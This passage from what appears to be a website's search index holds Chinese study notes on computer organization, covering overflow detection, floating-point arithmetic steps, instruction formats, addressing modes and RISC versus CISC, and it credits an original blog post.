2\uff09\u5982\u679c\u53c2\u52a0\u64cd\u4f5c\u7684\u4e24\u4e2a\u6570\u7b26\u53f7\u76f8\u540c\uff08\u8f6c\u6362\u6210\u8865\u7801\u7684\u52a0\u6cd5\uff09\uff0c\u5176\u7ed3\u679c\u4e0e\u6e90\u64cd\u4f5c\u6570\u7b26\u53f7\u4e0d\u540c\uff0c\u5373\u4e3a\u6ea2\u51fa\u3002 3\uff09\u5982\u679c\u8865\u7801\u91c7\u75281\u4f4d\u7b26\u53f7\u4f4d\uff0c\u5982\u679c\u6700\u9ad8\u6709\u6548\u4f4d\u7684\u8fdb\u4f4d\u548c\u7b26\u53f7\u4f4d\u7684\u8fdb\u4f4d\u4e0d\u540c\uff0c\u5219\u53d1\u751f\u6ea2\u51fa\u3002</p> <p>16\u3001\u5b9a\u70b9\u4e58\u6cd5\u8fd0\u7b97\u53ef\u4ee5\u4f7f\u7528\u52a0\u6cd5\u548c\u79fb\u4f4d\u6765\u5b9e\u73b0\u5417\uff1f \u53ef\u4ee5\u3002</p> <p>17\u3001\u6d6e\u70b9\u52a0\u51cf\u8fd0\u7b97\u57fa\u672c\u6309\u7167\u54ea\u51e0\u6b65\u6765\u8fdb\u884c\uff1f</p> <p>1\uff09\u5bf9\u9636\uff1a\u4f7f\u5c0f\u6570\u70b9\u5bf9\u9f50\uff1b 2\uff09\u5c3e\u6570\u6c42\u548c\uff1a\u5c06\u5bf9\u9636\u540e\u7684\u4e24\u4e2a\u5c3e\u6570\u6309\u7167\u5b9a\u70b9\u52a0\u51cf\u8fd0\u7b97\u89c4\u5219\u6c42\u548c\uff1b 3\uff09\u89c4\u683c\u5316\uff1a\u5c3e\u6570\u89c4\u683c\u5316\uff1b 4\uff09\u820d\u5165\uff1a\u5c3e\u6570\u53f3\u89c4\u65f6\uff0c\u4e22\u5931\u6570\u503c\u4f4d\uff1b 5\uff09\u6ea2\u51fa\u5224\u65ad\uff1a\u5224\u65ad\u7ed3\u679c\u662f\u5426\u6ea2\u51fa\u3002</p> <p>18\u3001\u5982\u4f55\u5224\u65ad\u6d6e\u70b9\u8fd0\u7b97\u7ed3\u679c\u662f\u5426\u6ea2\u51fa\uff1f \u9636\u7801\u662f\u5426\u8d85\u51fa\u4e86\u5176\u8868\u793a\u8303\u56f4\u3002\uff08\u4f7f\u75282\u4e2a\u7b26\u53f7\u4f4d\u5224\u6ea2\u51fa\uff09</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/#_7","title":"\u7b2c\u4e03\u7ae0 \u6307\u4ee4\u7cfb\u7edf","text":"<p>1\u3001\u4ec0\u4e48\u662f\u673a\u5668\u6307\u4ee4\uff1f\u4ec0\u4e48\u662f\u6307\u4ee4\u7cfb\u7edf\uff1f 1\uff09\u673a\u5668\u6307\u4ee4\uff1a\u6bcf\u4e00\u6761\u673a\u5668\u8bed\u8a00\u7684\u8bed\u53e5\uff1b 2\uff09\u6307\u4ee4\u7cfb\u7edf\uff1a\u5168\u90e8\u673a\u5668\u6307\u4ee4\u7684\u96c6\u5408\u3002</p> <p>2\u3001\u4e00\u6761\u6307\u4ee4\u5305\u542b\u54ea\u4e24\u4e2a\u4e3b\u8981\u90e8\u5206\uff1f\u8bf7\u7b80\u8981\u8bf4\u660e\u5404\u90e8\u5206\u4f5c\u7528\u3002 1\uff09\u64cd\u4f5c\u7801\uff1a\u6307\u660e\u6307\u4ee4\u8981\u5b8c\u6210\u7684\u64cd\u4f5c\uff1b 2\uff09\u5730\u5740\u7801\uff1a\u6307\u660e\u6307\u4ee4\u8981\u64cd\u4f5c\u7684\u6570\u636e\u6216\u6570\u636e\u6765\u6e90\uff1b</p> <p>3\u3001\u64cd\u4f5c\u7801\u957f\u5ea6\u6709\u56fa\u5b9a\u957f\u5ea6\u548c\u53ef\u53d8\u957f\u5ea6\u4e24\u79cd\uff0c\u5404\u81ea\u6709\u4ec0\u4e48\u4f18\u70b9\uff1f 1\uff09\u56fa\u5b9a\u957f\u5ea6\uff1a\u4fbf\u4e8e\u786c\u4ef6\u8bbe\u8ba1\uff0c\u6307\u4ee4\u8bd1\u7801\u65f6\u95f4\u77ed\uff1b 2\uff09\u53ef\u53d8\u957f\u5ea6\uff1a\u538b\u7f29\u4e86\u64cd\u4f5c\u7801\u5e73\u5747\u957f\u5ea6\uff1b</p> <p>4\u3001\u6307\u4ee4\u4e2d\u5730\u5740\u7801\u4e2d\u7684\u5730\u5740\u53ef\u4ee5\u662f\u54ea\u4e9b\u8bbe\u5907\u7684\u5730\u5740\uff1f \u53ef\u4ee5\u662f\u4e3b\u5b58\u5730\u5740\u3001\u5bc4\u5b58\u5668\u5730\u5740\u6216I/O\u8bbe\u5907\u7684\u5730\u5740\uff1b</p> <p>5\u3001\u6307\u4ee4\u4e2d\u5730\u5740\u7684\u4e2a\u6570\u53ef\u4ee5\u6709\u51e0\u4e2a\uff1f \u56db\u5730\u5740\u3001\u4e09\u5730\u5740\u3001\u4e8c\u5730\u5740\u3001\u4e00\u5730\u5740\u4ee5\u53ca\u96f6\u5730\u5740\u3002</p> <p>6\u3001\u5047\u8bbe\u6307\u4ee4\u4e2d\u6709\u56db\u4e2a\u5730\u5740\u3001\u4e09\u4e2a\u5730\u5740\u3001\u4e24\u4e2a\u5730\u5740\u4ee5\u53ca\u4e00\u4e2a\u5730\u5740\uff0c\u5404\u81ea\u9700\u8981\u8bbf\u5b58\u51e0\u6b21\uff1f 1\uff09\u56db\u5730\u5740\uff1a\u8bbf\u5b584\u6b21\uff1b 2\uff09\u4e09\u5730\u5740\uff1a\u8bbf\u5b584\u6b21\uff1b 3\uff09\u4e24\u5730\u5740\uff1a\u8bbf\u5b583\u6b21\uff1b 4\uff09\u4e00\u5730\u5740\uff1a\u8bbf\u5b582\u6b21\uff1b</p> <p>7\u3001\u5f53\u4f7f\u7528\u5bc4\u5b58\u5668\u4ee3\u66ff\u6307\u4ee4\u5b57\u4e2d\u7684\u5730\u5740\u7801\u5b57\u6bb5\u540e\uff0c\u6709\u54ea\u4e9b\u4f18\u70b9\uff1f 1\uff09\u6269\u5927\u6307\u4ee4\u5b57\u7684\u5bfb\u5740\u8303\u56f4\uff1b 2\uff09\u7f29\u77ed\u6307\u4ee4\u5b57\u957f\uff1b 3\uff09\u51cf\u5c11\u8bbf\u5b58\u6b21\u6570</p> <p>8\u3001\u6570\u636e\u5728\u5b58\u50a8\u5668\u4e2d\u5b58\u50a8\u65f6\uff0c\u4e3a\u4ec0\u4e48\u8981\u6309\u7167\u8fb9\u754c\u5bf9\u9f50\uff1f \u51cf\u5c11\u8bbf\u5b58\u6b21\u6570\u3002</p> <p>9\u3001\u5bfb\u5740\u65b9\u5f0f\u5305\u62ec\u54ea\u4e24\u7c7b\uff1f 1\uff09\u6307\u4ee4\u5bfb\u5740\uff1a\u4e0b\u4e00\u6761\u5c06\u8981\u6267\u884c\u7684\u6307\u4ee4\u7684\u6307\u4ee4\u5730\u5740\uff1b 2\uff09\u6570\u636e\u5bfb\u5740\uff1a\u786e\u5b9a\u672c\u6307\u4ee4\u7684\u64cd\u4f5c\u6570\u5730\u5740\u3002</p> <p>10\u3001\u4ec0\u4e48\u662f\u5f62\u5f0f\u5730\u5740\uff1f\u4ec0\u4e48\u662f\u6709\u6548\u5730\u5740\uff1f 1\uff09\u5f62\u5f0f\u5730\u5740\uff1a\u6307\u4ee4\u7684\u5730\u5740\u7801\u5b57\u6bb5\u901a\u5e38\u90fd\u4e0d\u4ee3\u8868\u64cd\u4f5c\u6570\u7684\u771f\u5b9e\u5730\u5740\uff0c\u6210\u4e3a\u5f62\u5f0f\u5730\u5740\uff0c\u8bb0\u4e3aA\uff1b 2\uff09\u6709\u6548\u5730\u5740\uff1a\u64cd\u4f5c\u6570\u7684\u771f\u5b9e\u5730\u5740\uff0c\u8bb0\u4e3aEA\uff0c\u7531\u5bfb\u5740\u7279\u5f81\u548c\u5f62\u5f0f\u5730\u5740\u5171\u540c\u51b3\u5b9a\uff1b</p> <p>11\u3001\u4e86\u89e3\u5404\u79cd\u5bfb\u5740\u65b9\u5f0f\u7684\u6982\u5ff5\u53ca\u6839\u636e\u5f62\u5f0f\u5730\u5740\u5f62\u6210\u6709\u6548\u5730\u5740\u7684\u65b9\u5f0f\u3002 \u7acb\u5373\u5bfb\u5740\u3001\u76f4\u63a5\u5bfb\u5740\u3001\u9690\u542b\u5bfb\u5740\u3001\u95f4\u63a5\u5bfb\u5740\u3001\u5bc4\u5b58\u5668\u5bfb\u5740\u3001\u5bc4\u5b58\u5668\u95f4\u63a5\u5bfb\u5740\u3001\u57fa\u5740\u5bfb\u5740\uff08\u9690\u5f0f\u6216\u663e\u5f0f\uff09\u3001\u53d8\u5740\u5bfb\u5740\u3001\u76f8\u5bf9\u5bfb\u5740\u3001\u5806\u6808\u5bfb\u5740</p> <p>12\u3001\u4ec0\u4e48\u662fRISC\uff1f\u4ec0\u4e48\u662fCISC\uff1f RISC\uff1a\u7cbe\u7b80\u6307\u4ee4\u96c6\uff1b CISC\uff1a\u590d\u6742\u6307\u4ee4\u96c6\uff1b</p> <p>Michael AN \u8fdb\u884c\u540e\u671f\u6574\u7406\u4fee\u6539\uff0c\u539f\u6587\u94fe\u63a5\uff1ahttps://blog.csdn.net/Adjerrekaf/article/details/78880089</p>"}]}